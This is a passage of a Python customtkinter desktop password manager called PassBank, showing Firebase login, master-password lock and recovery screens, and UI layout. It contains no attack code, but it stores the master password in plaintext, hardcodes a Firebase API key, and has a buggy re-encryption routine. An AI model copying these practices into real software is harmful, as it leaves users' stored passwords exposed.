                    text2.bind("<Button-1>", open_check_password)

                def details(event):
                    def handle_click(event):
                        x, y = event.x_root, event.y_root

                        frame_x = details_main_frame.winfo_rootx()
                        frame_y = details_main_frame.winfo_rooty()

                        if (frame_x <= x <= frame_x + details_main_frame.winfo_width() and
                                frame_y <= y <= frame_y + details_main_frame.winfo_height()):
                            pass
                        else:
                            details_main_frame.place_forget()
                            try:
                                root.unbind("<Button-1>", handle_click) 
                            except:
                                pass


                    def logout(event):
                        password_main_frame.place_forget()
                        add_password_main_frame.place_forget()
                        generate_password_main_frame.place_forget()
                        check_password_main_frame.place_forget()
                        generate_password_main_frame2.place_forget()
                        get_started_main_frame1.place_forget()
                        details_main_frame.place_forget()
                        left_sidebar.pack_forget()
                        profile_settings_main_frame.place_forget()

                        root.geometry("400x480")

                        login_page.place(relx=0.5, rely=0.5, anchor="center")


                    def lock_app(event):
                        password_main_frame.place_forget()
                        add_password_main_frame.place_forget()
                        generate_password_main_frame.place_forget()
                        check_password_main_frame.place_forget()
                        generate_password_main_frame2.place_forget()
                        get_started_main_frame1.place_forget()
                        details_main_frame.place_forget()
                        left_sidebar.pack_forget()
                        profile_settings_main_frame.place_forget()

                        root.geometry("400x480")

                        def final_check(event):
                            global master_password
                            master_password = master_password_entry.get()
                            master_password_alerts.place_forget()
                            hashed = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password']

                            if hashed == master_password:
                                master_password_page.place_forget()
                                main_code()
                            else:
                                master_password_alerts.place(x=63, y=290)
                                return
                    
                        def remove_logout(event):
                            def go_back(event):
                                actions_page.place_forget()
                            def close_app():
                                exit(1)
                            def logout(event):
                                actions_page.place_forget()
                                master_password_page.place_forget()
                                root.geometry("400x480")

                                login_page.place(relx=0.5, rely=0.5, anchor="center")
                            def remove():
                                actions_page.place_forget()
                                master_password_page.place_forget()
                                root.geometry("400x480")

                                login_page.place(relx=0.5, rely=0.5, anchor="center")
                                email_entry.delete(0, 'end')

                            actions_page = customtkinter.CTkFrame(root, width=400, height=480)
                            actions_page.place(relx=0.5, rely=0.5, anchor="center")
                            actions_page.propagate(False)

                            customtkinter.CTkLabel(actions_page, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\bigger-temp-profile.png")).pack(pady=(50,15))

                            customtkinter.CTkLabel(actions_page, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15, weight="bold")).pack()

                            close = customtkinter.CTkLabel(master=actions_page, text="",image=PhotoImage(file=folder_path+r"\back.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                            close.place(x=20, y=20)
                            close.bind("<Button-1>", go_back)

                            remove_button = customtkinter.CTkButton(actions_page, text="Remove", fg_color="#212121" ,font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=remove)
                            remove_button.pack(pady=(15,5), padx=20)

                            logout_button = customtkinter.CTkButton(actions_page, text="Log Out", fg_color="#212121", text_color="#F95D60", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B")
                            logout_button.pack(pady=(5,30), padx=20)
                            logout_button.bind("<Button-1>", logout)

                            line = Frame(actions_page, bg='#4d4d4d', width=800, height=1)
                            line.pack()

                            close_button = customtkinter.CTkButton(actions_page, text="Close App", fg_color="#212121", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=100, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=close_app)
                            close_button.pack(pady=(60,30), padx=20)


                        master_password_page = customtkinter.CTkFrame(root, width=400, height=480)
                        master_password_page.place(relx=0.5, rely=0.5, anchor="center")
                        master_password_page.propagate(False)

                        customtkinter.CTkLabel(master_password_page, text="Enter Master Password", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=(90,0), padx=20)

                        user_details_frame = customtkinter.CTkFrame(master_password_page, width=280, height=38, corner_radius=50, border_color="#54585F", border_width=2, cursor="hand2")
                        user_details_frame.pack(pady=(33, 30))
                        user_details_frame.propagate(False) 
                        user_details_frame.bind("<Button-1>", remove_logout)
                        
                        with open(os.path.join(folder_path, "smaller-temp-profile.png"), "wb") as f:
                            f.write(requests.get(f"https://ui-avatars.com/api/?rounded=true&name={user['displayName']}&&size=34").content)      
                        
                        profile_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\smaller-temp-profile.png"))
                        profile_image.pack(side="left", padx=(6,10), pady=(0,1))    
                        profile_image.bind("<Button-1>", remove_logout)
                        
                        email_label = customtkinter.CTkLabel(user_details_frame, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15))
                        email_label.pack(padx=(0,0), side="left") 
                        email_label.bind("<Button-1>", remove_logout)

                        down_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\down.png"))
                        down_image.pack(anchor="e", padx=15,pady=(12,0))   
                        user_details_frame.bind("<Button-1>", remove_logout)

                        master_password_alerts = customtkinter.CTkLabel(master_password_page, text="Incorrect Master Password",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

                        master_password_entry = customtkinter.CTkEntry(master_password_page, placeholder_text='Master Password', width=280, height=46, show="●")
                        master_password_entry.pack(pady=20, padx=20)
                        master_password_entry.bind("<Return>", final_check)
                        master_password_entry.focus_set()

                        check = customtkinter.CTkButton(master_password_page, text="Unlock PassBank", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280)
                        check.pack(pady=(15,30), padx=20)
                        check.bind("<Button-1>", final_check)

                        forgot_master_password = customtkinter.CTkLabel(master_password_page, text="Forgot Master Password?", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
                        forgot_master_password.pack(pady=(50,20))
                        forgot_master_password.bind("<Button-1>", forgot_master_password_function)




                    details_main_frame.place(x=30, y=60)
                    details_main_frame.propagate(False)

                    circle_frame = customtkinter.CTkFrame(master=details_main_frame, width=64 ,height=64, corner_radius=50, fg_color="#212121")
                    circle_frame.pack(pady=(20,0))

                    circle_frame_image = PhotoImage(file=folder_path+r'\bigger-temp-profile.png')

                    circle_frame_image = customtkinter.CTkLabel(master=circle_frame, text="", image=circle_frame_image, fg_color="#212121")
                    circle_frame_image.place(relx=0.5, rely=0.5, anchor="center")

                    up_arrow = customtkinter.CTkLabel(master=details_main_frame, text=f"{user['email']}", font=customtkinter.CTkFont(family="Rem", size=15, weight="bold"))
                    up_arrow.pack(pady=(10,10))

                    save_button = customtkinter.CTkButton(master=details_main_frame, text="Profile Settings",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", hover_color="#0BA1A2", command=profile_settings)
                    save_button.pack()

                    line = Frame(details_main_frame, bg='#4d4d4d', width=1000, height=1)
                    line.pack(pady=(20,10))

                    up_arrow = customtkinter.CTkLabel(master=details_main_frame, text="Lock App", cursor="hand2",font=customtkinter.CTkFont(family="Rem", size=17, weight="bold"))
                    up_arrow.pack(pady=(10,10), padx=20, anchor='w')
                    up_arrow.bind("<Button-1>", lock_app)

                    logout_label = customtkinter.CTkLabel(master=details_main_frame, text="Log Out",cursor="hand2", font=customtkinter.CTkFont(family="Rem", size=17, weight="bold"), text_color="#C64759")
                    logout_label.pack(pady=(10,10), padx=20, anchor='w')
                    logout_label.bind("<Button-1>", logout)

                    root.bind("<Button-1>", handle_click)

                open_get_started(1)

                root.bind('<FocusOut>', on_focus_out)

                get_started_frame = customtkinter.CTkFrame(master=get_started_main_frame, corner_radius=0, cursor="hand2", bg_color="#212121", fg_color="#212121")
                get_started_frame.pack()
                get_started_frame.bind("<Button-1>", open_get_started)

                get_started_image = PhotoImage(file=folder_path+r"\lightning.png")

                get_started_image_label = customtkinter.CTkLabel(master=get_started_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=get_started_image)
                get_started_image_label.grid(padx=(10, 3), pady=(0,2), sticky="w", column=0, row=0, ipadx=0)
                get_started_image_label.bind("<Button-1>", open_get_started)

                get_started_label = customtkinter.CTkLabel(master=get_started_frame, text='Get Started', font=customtkinter.CTkFont(family="Roboto", size=15))
                get_started_label.grid(padx=7, pady=(0,2), sticky="w", column=1, row=0, ipadx=0)
                get_started_label.bind("<Button-1>", open_get_started)

                passwords_frame = customtkinter.CTkFrame(master=categories_frame, corner_radius=0, cursor="hand2", bg_color="#212121", fg_color="#212121")
                passwords_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nsew")
                passwords_frame.bind("<Button-1>", open_password)

                passwords_image = PhotoImage(file=folder_path+r"\password.png")

                passwords_text = customtkinter.CTkLabel(master=passwords_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=passwords_image)
                passwords_text.grid(padx=(10, 3), pady=(0,2), sticky="w", column=0, row=0, ipadx=0)

                passwords_label = customtkinter.CTkLabel(master=passwords_frame, text='Passwords', font=customtkinter.CTkFont(family="Roboto", size=15))
                passwords_label.grid(padx=10, pady=(0,2), sticky="w", column=1, row=0, ipadx=0)
                passwords_label.bind("<Button-1>", open_password)

                secure_note_frame = customtkinter.CTkFrame(master=categories_frame, corner_radius=0, cursor="hand2", bg_color="#212121", fg_color="#212121")
                secure_note_frame.grid(row=1, column=0, padx=0, pady=0, sticky="nsew")
                secure_note_frame.bind("<Button-1>", open_secure_note)

                secure_note_image = PhotoImage(file=folder_path+r"\note.png")

                secure_note_text = customtkinter.CTkLabel(master=secure_note_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=secure_note_image)
                secure_note_text.grid(padx=(10, 3), pady=7, sticky="w", column=0, row=0, ipadx=0)

                secure_note_label = customtkinter.CTkLabel(master=secure_note_frame, text='Secure Notes', font=customtkinter.CTkFont(family="Roboto", size=15))
                secure_note_label.grid(padx=10, pady=7, sticky="w", column=1, row=0, ipadx=0)
                secure_note_label.bind("<Button-1>", open_secure_note)

                generate_pass_frame = customtkinter.CTkFrame(master=tools_frame, corner_radius=0, cursor="hand2", bg_color="#212121", fg_color="#212121")
                generate_pass_frame.grid(row=2, column=0, padx=0, pady=0, sticky="nsew")
                generate_pass_frame.bind("<Button-1>", open_generate_password)

                generate_pass_image = PhotoImage(file=folder_path+r"\generate_password.png")

                generate_pass_text = customtkinter.CTkLabel(master=generate_pass_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=generate_pass_image)
                generate_pass_text.grid(padx=(10, 3), pady=7, sticky="w", column=0, row=0, ipadx=0)
                generate_pass_text.bind("<Button-1>", open_generate_password)

                generate_pass_label = customtkinter.CTkLabel(master=generate_pass_frame, text='Generate a password', font=customtkinter.CTkFont(family="Roboto", size=15))
                generate_pass_label.grid(padx=10, pady=7, sticky="w", column=1, row=0, ipadx=0)
                generate_pass_label.bind("<Button-1>", open_generate_password)

                check_pass_frame = customtkinter.CTkFrame(master=tools_frame, corner_radius=0, cursor="hand2", bg_color="#212121", fg_color="#212121")
                check_pass_frame.grid(row=3, column=0, padx=0, pady=0, sticky="nsew")
                check_pass_frame.bind("<Button-1>", open_check_password)

                check_pass_image = PhotoImage(file=folder_path+r'\heart.png')

                check_pass_text = customtkinter.CTkLabel(master=check_pass_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=check_pass_image)
                check_pass_text.grid(padx=(10, 3), pady=7, sticky="w", column=0, row=0, ipadx=0)
                check_pass_text.bind("<Button-1>", open_check_password)

                check_pass_label = customtkinter.CTkLabel(master=check_pass_frame, text='Check password health', font=customtkinter.CTkFont(family="Roboto", size=15))
                check_pass_label.grid(padx=10, pady=7, sticky="w", column=1, row=0, ipadx=0)
                check_pass_label.bind("<Button-1>", open_check_password)

                line = Frame(left_sidebar, bg='#4d4d4d', width=1000, height=1)
                line.pack()

                tools = customtkinter.CTkFrame(master=left_sidebar, fg_color="#212121")
                tools.pack(anchor="w",pady=(5,0))

                tools_header = customtkinter.CTkLabel(master=tools, text="Tools", fg_color="#212121",  font=customtkinter.CTkFont(family="Roboto", size=15))
                tools_header.grid(row=0, column=0,padx=10 , pady=5)

                up_arrow = customtkinter.CTkLabel(master=tools, text="", image=PhotoImage(file=folder_path+r'\down-arrow.png'), fg_color="#212121", cursor="hand2")
                up_arrow.grid(row=0, column=1,padx=150)
                up_arrow.bind("<Button-1>", collapse_function_2)

                tools_frame.pack(padx=0, pady=5, anchor='nw')

                line = Frame(left_sidebar, bg='#4d4d4d', width=1000, height=1)
                line.pack()

                circle_frame.bind("<Button-1>", details)
                circle_frame_image.bind("<Button-1>", details)

                root.geometry("1280x700")

            def forgot_master_password_function(event):
                def after_confirmation():
                    def update_master_password():
                        master_password1 = recovery_code_entry.get()

                        master_password_1 = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password']

                        try:
                            sample_ordered_dict = db.child("users").child(f"{auth.current_user['localId']}").child("passwords").get().val()

                            key = base64.urlsafe_b64encode(hashlib.sha256(master_password_1.encode()).digest()[:32]).decode()
                            cipher_suite = Fernet(key)

                            db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"master_password" : master_password1 })

                            key1 = base64.urlsafe_b64encode(hashlib.sha256(master_password1.encode()).digest()[:32]).decode()
                            cipher_suite1 = Fernet(key1)

                            converted_data = {}

                            for key, value in sample_ordered_dict.items():
                                decrypted_data = {}
                                for sub_key, sub_value in value.items():
                                    decrypted_value = cipher_suite1.encrypt(bytes(cipher_suite.decrypt(sub_value).decode(), 'utf-8')).decode()
                                    decrypted_data[sub_key] = decrypted_value
                                converted_data[cipher_suite1.encrypt(bytes(cipher_suite.decrypt(sub_value).decode(), 'utf-8')).decode()] = decrypted_data

                            db.child("users").child(f"{auth.current_user['localId']}").child("passwords").set(converted_data)

                        except:
                            pass


                        global master_password

                        master_password += master_password1

                        main_code()

                    def go_to_master_password(event):
                        master_password_forgot.place_forget()

                    master_password_forgot = customtkinter.CTkFrame(root, width=400, height=480)
                    master_password_forgot.place(relx=0.5, rely=0.5, anchor="center")
                    master_password_forgot.propagate(False)

                    close = customtkinter.CTkLabel(master=master_password_forgot, text="",image=PhotoImage(file=folder_path+r"\back.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                    close.place(x=20, y=20)
                    close.bind("<Button-1>", go_to_master_password)

                    customtkinter.CTkLabel(master_password_forgot, text="Create Master Password", font=customtkinter.CTkFont(family="Rem", size=25, weight="bold")).pack(pady=(90,5), padx=20)

                    customtkinter.CTkLabel(master_password_forgot, text="Important: You will be using Master Password as a key to unlock your passwords",wraplength=360,justify="center", font=customtkinter.CTkFont(family="Rem", size=16, weight="bold")).pack(pady=(10,30), padx=20)
                    
                    customtkinter.CTkLabel(master_password_forgot, text=f"{user['email']} ● Logout", font=customtkinter.CTkFont(family="Rem", size=16)).pack(pady=5, padx=20)

                    recovery_code_entry = customtkinter.CTkEntry(master_password_forgot, placeholder_text='Master Password', width=280, height=46, show="●")
                    recovery_code_entry.pack(pady=20, padx=20)

                    check = customtkinter.CTkButton(master_password_forgot, text="Continue", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280,command=update_master_password)
                    check.pack(pady=(15,30), padx=20)

                def add_hyphens(event):
                    entry_text = recovery_code_entry.get()
                    entry_text = entry_text.replace("-", "")
                    entry_text = entry_text.upper()
                    formatted_text = ''

                    for i, char in enumerate(entry_text):

                        if len(formatted_text) == 29:
                            break

                        if i > 0 and i % 4 == 0:
                            formatted_text += "-"
                        formatted_text += char

                    recovery_code_entry.delete(0, customtkinter.END)
                    recovery_code_entry.insert(0, formatted_text)

                def recovery_code_final_check():
                    recovery_code = firebase.database().child("users").child(auth.current_user['localId']).child("user-details").child("master_password_recovery_code").get().val()
                    g = recovery_code_entry.get()

                    if recovery_code == g:
                        after_confirmation()
                    else:
                        pass

                def go_to_master_password(event):
                    master_password_forgot.place_forget()

                master_password_forgot = customtkinter.CTkFrame(root, width=400, height=480)
                master_password_forgot.place(relx=0.5, rely=0.5, anchor="center")
                master_password_forgot.propagate(False)

                close = customtkinter.CTkLabel(master=master_password_forgot, text="",image=PhotoImage(file=folder_path+r"\back.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                close.place(x=20, y=20)
                close.bind("<Button-1>", go_to_master_password)

                customtkinter.CTkLabel(master_password_forgot, text="Enter Recovery Code", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=(90,80), padx=20)

                recovery_code_entry = customtkinter.CTkEntry(master_password_forgot, placeholder_text='Recovery Code', width=280, height=46)
                recovery_code_entry.pack(pady=20, padx=20)
                recovery_code_entry.bind("<KeyRelease>", add_hyphens)

                check = customtkinter.CTkButton(master_password_forgot, text="Continue", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, command=recovery_code_final_check)
                check.pack(pady=(15,30), padx=20)


            global user
            user = auth.sign_in_with_email_and_password(email, password)
            check = auth.get_account_info(user['idToken'])['users'][0]['emailVerified']

            if check:
                pass
            else:
                email_alerts_verified.place(x=58, y=290)
                return

            password_entry.delete(0, 'end')

            def master_password_checker(master_password_exists):     
                with open(os.path.join(folder_path, "bigger-temp-profile.png"), "wb") as f:
                    f.write(requests.get(f"https://ui-avatars.com/api/?rounded=true&name={auth.get_account_info(id_token=user['idToken'])['users'][0]['displayName']}&&size=70").content)           
                if master_password_exists:
                    def final_check(event):
                        global master_password
                        master_password = master_password_entry.get()

                        master_password_alerts.place_forget()
                        hashed = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password']

                        if hashed == master_password:
                            master_password_page.place_forget()
                            main_code()
                        else:
                            master_password_alerts.place(x=63, y=290)
                            return

                    def remove_logout(event):
                        print("Here")
                        def go_back(event):
                            actions_page.place_forget()
                        def close_app():
                            exit(1)
                        def logout(event):
                            actions_page.place_forget()
                            master_password_page.place_forget()
                            root.geometry("400x480")

                            login_page.place(relx=0.5, rely=0.5, anchor="center")
                        def remove():
                            actions_page.place_forget()
                            master_password_page.place_forget()
                            root.geometry("400x480")

                            login_page.place(relx=0.5, rely=0.5, anchor="center")
                            email_entry.delete(0, 'end')


                        actions_page = customtkinter.CTkFrame(root, width=400, height=480)
                        actions_page.place(relx=0.5, rely=0.5, anchor="center")
                        actions_page.propagate(False)
   
                        customtkinter.CTkLabel(actions_page, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\bigger-temp-profile.png")).pack(pady=(50,15))

                        customtkinter.CTkLabel(actions_page, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15, weight="bold")).pack()

                        close = customtkinter.CTkLabel(master=actions_page, text="",image=PhotoImage(file=folder_path+r"\back.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                        close.place(x=20, y=20)
                        close.bind("<Button-1>", go_back)

                        remove_button = customtkinter.CTkButton(actions_page, text="Remove", fg_color="#212121" ,font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=remove)
                        remove_button.pack(pady=(15,5), padx=20)

                        logout_button = customtkinter.CTkButton(actions_page, text="Log Out", fg_color="#212121", text_color="#F95D60", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B")
                        logout_button.pack(pady=(5,30), padx=20)
                        logout_button.bind("<Button-1>", logout)

                        line = Frame(actions_page, bg='#4d4d4d', width=800, height=1)
                        line.pack()

                        close_button = customtkinter.CTkButton(actions_page, text="Close App", fg_color="#212121", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=100, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=close_app)
                        close_button.pack(pady=(60,30), padx=20)

                    master_password_page = customtkinter.CTkFrame(root, width=400, height=480)
                    master_password_page.place(relx=0.5, rely=0.5, anchor="center")
                    master_password_page.propagate(False)   

                    customtkinter.CTkLabel(master_password_page, text="Enter Master Password", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=(90,0), padx=20)    
                    
                    user_details_frame = customtkinter.CTkFrame(master_password_page, width=280, height=38, corner_radius=50, border_color="#54585F", border_width=2, cursor="hand2")
                    user_details_frame.pack(pady=(33, 30))
                    user_details_frame.propagate(False) 
                    user_details_frame.bind("<Button-1>", remove_logout)
                    
                    with open(os.path.join(folder_path, "smaller-temp-profile.png"), "wb") as f:
                        f.write(requests.get(f"https://ui-avatars.com/api/?rounded=true&name={user['displayName']}&&size=34").content)      
                    
                    profile_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\smaller-temp-profile.png"))
                    profile_image.pack(side="left", padx=(6,10), pady=(0,1))    
                    profile_image.bind("<Button-1>", remove_logout)
                    
                    email_label = customtkinter.CTkLabel(user_details_frame, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15))
                    email_label.pack(padx=(0,0), side="left") 
                    email_label.bind("<Button-1>", remove_logout)

                    down_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\down.png"))
                    down_image.pack(anchor="e", padx=15,pady=(12,0))   
                    user_details_frame.bind("<Button-1>", remove_logout)
                    
                    master_password_alerts = customtkinter.CTkLabel(master_password_page, text="Incorrect Master Password",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")  
                    
                    master_password_entry = customtkinter.CTkEntry(master_password_page, placeholder_text='Master Password', width=280, height=46, show="●")
                    master_password_entry.pack(pady=20, padx=20)    
                    master_password_entry.bind("<Return>", final_check)
                    master_password_entry.focus_set()
                    
                    check = customtkinter.CTkButton(master_password_page, text="Unlock PassBank", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280)
                    check.pack(pady=(15,30), padx=20)   
                    check.bind("<Button-1>", final_check)
                
                    forgot_master_password = customtkinter.CTkLabel(master_password_page, text="Forgot Master Password?", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
                    forgot_master_password.pack(pady=(30,20))   
                    forgot_master_password.bind("<Button-1>", forgot_master_password_function)

                else:
                    def final_check():
                        global master_password
                        master_password = master_password_entry.get()
                        master_password_page.place_forget()

                        key = base64.urlsafe_b64encode(hashlib.sha256(master_password.encode()).digest()[:32]).decode()
                        cipher_suite = Fernet(key)

                        db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"master_password_exists" : True })

                        db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"master_password" : master_password })

                        main_code()

                    master_password_page = customtkinter.CTkFrame(root, height=400)
                    master_password_page.place(relx=0.5, rely=0.5, anchor="center")

                    db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"master_password_exists" : False })

                    customtkinter.CTkLabel(master_password_page, text="Set your Master Password", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=50, padx=20)

                    master_password_entry = customtkinter.CTkEntry(master_password_page, placeholder_text='Master Password', width=280, height=46, show="●")
                    master_password_entry.pack(pady=10, padx=20)
                    
                    master_password_alerts = customtkinter.CTkLabel(master_password_page, text="Incorrect Master Password",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")
                    
                    check = customtkinter.CTkButton(master_password_page, text="Set Master Password", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, command=final_check)
                    check.pack(pady=10, padx=20)

            password_alerts_login.place_forget()
            email_alerts_login.place_forget()
            login_page.place_forget()
            main_page.place_forget()
            main_page.pack_forget()

            try:
                name = auth.get_account_info(id_token=user['idToken'])['users'][0]['displayName']
                
                response = requests.post("https://identitytoolkit.googleapis.com/v1/accounts:update?key=AIzaSyDO9WgyHMwZwu3n5O2kt55AQ8HcRMYZcGc", headers={"Content-Type": "application/json"}, json={
                    "idToken": user['idToken'],
                    "photoUrl": f"https://ui-avatars.com/api/?rounded=true&name={name}&&size=50",
                })

                response = requests.get(auth.get_account_info(id_token=user['idToken'])['users'][0]['photoUrl'])
                
                with open(os.path.join(folder_path, "temp-profile.png"), "wb") as f:
                    f.write(response.content)

                master_password_exists = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password_exists']
                master_password_checker(master_password_exists=master_password_exists)

            except:
                db.child("users").child(auth.current_user['localId']).child("user-details").update({"master_password_exists" : False })
                db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"autolock_timer" : "5 minutes" })

                def set_name():
                        final_name = name_entry.get()
                        response = requests.post("https://identitytoolkit.googleapis.com/v1/accounts:update?key=AIzaSyDO9WgyHMwZwu3n5O2kt55AQ8HcRMYZcGc", headers={"Content-Type": "application/json"}, json={
                            "idToken": user['idToken'],
                            "displayName" : final_name
                        })

                        name_page.place_forget()
                        response = requests.get(f"https://ui-avatars.com/api/?rounded=true&name={final_name}&&size=40")

                        with open(os.path.join(folder_path, "temp-profile.png"), "wb") as f:
                            f.write(response.content)
                        
                        
                        with open(os.path.join(folder_path, "bigger-temp-profile.png"), "wb") as f:
                            f.write(requests.get(f"https://ui-avatars.com/api/?rounded=true&name={final_name}&&size=70").content)

                        master_password_checker(master_password_exists=False)

                name_page = customtkinter.CTkFrame(root)
                name_page.place(relx=0.5, rely=0.5, anchor="center")

                customtkinter.CTkLabel(name_page, text="Set your Display Name", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=50, padx=20)

                name_entry = customtkinter.CTkEntry(name_page, placeholder_text='Display Name', width=280, height=46)
                name_entry.pack(pady=10, padx=20)

                set_button_1 = customtkinter.CTkButton(name_page, text="Login", font=customtkinter.CTkFont(family="Roboto", size=20),corner_radius=50, height=46, width=280,command=set_name)
                set_button_1.pack(pady=10, padx=20)

                response = requests.post("https://identitytoolkit.googleapis.com/v1/accounts:update?key=AIzaSyDO9WgyHMwZwu3n5O2kt55AQ8HcRMYZcGc", headers={"Content-Type": "application/json"}, json={
                    "idToken": user['idToken'],
                    "photoUrl": f"https://ui-avatars.com/api/?rounded=true&name={name_entry}&&size=40",
                })

                with open(os.path.join(folder_path, "temp-profile.png"), "wb") as f:
                    f.write(requests.get(auth.get_account_info(id_token=user['idToken'])['users'][0]['photoUrl']).content)
                
                master_password_exists = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password_exists']
                

        except requests.exceptions.HTTPError as e:
            email_alerts_login.place_forget()
            password_alerts_login.place_forget()
            if "INVALID_PASSWORD" in str(e):
                email_alerts_login.place_forget()
                password_alerts_login.place_forget()
                password_alerts_login.place(x=58, y=290)
            if "EMAIL_NOT_FOUND" in str(e):
                password_alerts_login.place_forget()
                email_alerts_login.place_forget()
                email_alerts_login.place(x=58, y=290)

def show_create_user():
    main_page.pack_forget()
    main_page.place_forget()
    login_page.place_forget()
    forgot_password_main_frame.place_forget()
    create_user_page.place(relx=0.5, rely=0.5, anchor="center")


def go_to_login_page(event):
    main_page.pack_forget()
    main_page.place_forget()
    create_user_page.place_forget()
    forgot_password_main_frame.place_forget()

    if event == "Created":
        verify_mail_alert.place(relx=0.5, rely=0.28, anchor="center")

    login_page.place(relx=0.5, rely=0.5, anchor="center")


def go_to_main_page(event):
    main_page.place_forget()
    create_user_page.place_forget()
    forgot_password_main_frame.place_forget()
    login_page.place_forget()

    main_page.pack()

def go_to_create_user_page(event):
    main_page.pack_forget()
    main_page.place_forget()
    forgot_password_main_frame.place_forget()
    main_page.pack_forget()
    login_page.place_forget()
    create_user_page.place(relx=0.5, rely=0.5, anchor="center")

def go_to_forget_password(event):
    main_page.place_forget()
    main_page.pack_forget()
    login_page.place_forget()
    forgot_password_main_frame.place(relx=0.5, rely=0.5, anchor="center")

def send_reset_mail(mail):
    auth.send_password_reset_email(mail)


customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("dark-blue")

root = customtkinter.CTk()
root.geometry("400x480")
# root.geometry("1280x700")
root.title("PassBank Password Manager")
root.resizable(False, False)

# ------------------------------------------------------------------------------------------------ Main Page ------------------------------------------------------------------------------------------------

main_page = customtkinter.CTkFrame(root, width=400, height=480)
main_page.propagate(False)

image = PhotoImage(file=folder_path+r"\Logo.png")
Logo = customtkinter.CTkLabel(main_page, text="", height=20, width=20, image=image)
Logo.pack(pady=(50,20), padx=10)

Welcome_Label = customtkinter.CTkLabel(main_page, text="Welcome to PassBank",
                                       font=customtkinter.CTkFont(family="Rem", size=25), corner_radius=50, height=46,
                                       width=260)
Welcome_Label.pack(pady=30, padx=20)

create_account_button = customtkinter.CTkButton(main_page, text="Create Account",
                                                font=customtkinter.CTkFont(family="Roboto", size=15), corner_radius=50,
                                                height=46, width=280, command=show_create_user, fg_color="#7D7E9A")
create_account_button.pack(pady=15, padx=20)

login_button = customtkinter.CTkButton(main_page, text="Login", font=customtkinter.CTkFont(family="Roboto", size=15),
                                       corner_radius=50, height=46, width=280, command=show_login, fg_color="#7D7E9A")
login_button.pack(pady=(10,20), padx=20)

main_page.pack()
# ------------------------------------------------------------------------------------- Login User ------------------------------------------------------------------------------------------------


login_page = customtkinter.CTkFrame(root, width=400, height=480)
login_page.propagate(False)

back = customtkinter.CTkLabel(master=login_page, text="", image=PhotoImage(file=folder_path+r"\back.png"), cursor="hand2")
back.place(x=20, y=20)
back.bind("<Button-1>", go_to_main_page)

dashboard_label_1 = customtkinter.CTkLabel(login_page, text="Login", font=customtkinter.CTkFont(family="Rem", size=25))
dashboard_label_1.pack(pady=(80,0), padx=20)

verify_mail_alert = customtkinter.CTkLabel(login_page, text="Please verify your email",font=customtkinter.CTkFont(family="Roboto", size=16), text_color="#696969")

email_entry = customtkinter.CTkEntry(login_page, placeholder_text='Email Address', width=280, height=46)
email_entry.pack(pady=(70,10), padx=20)
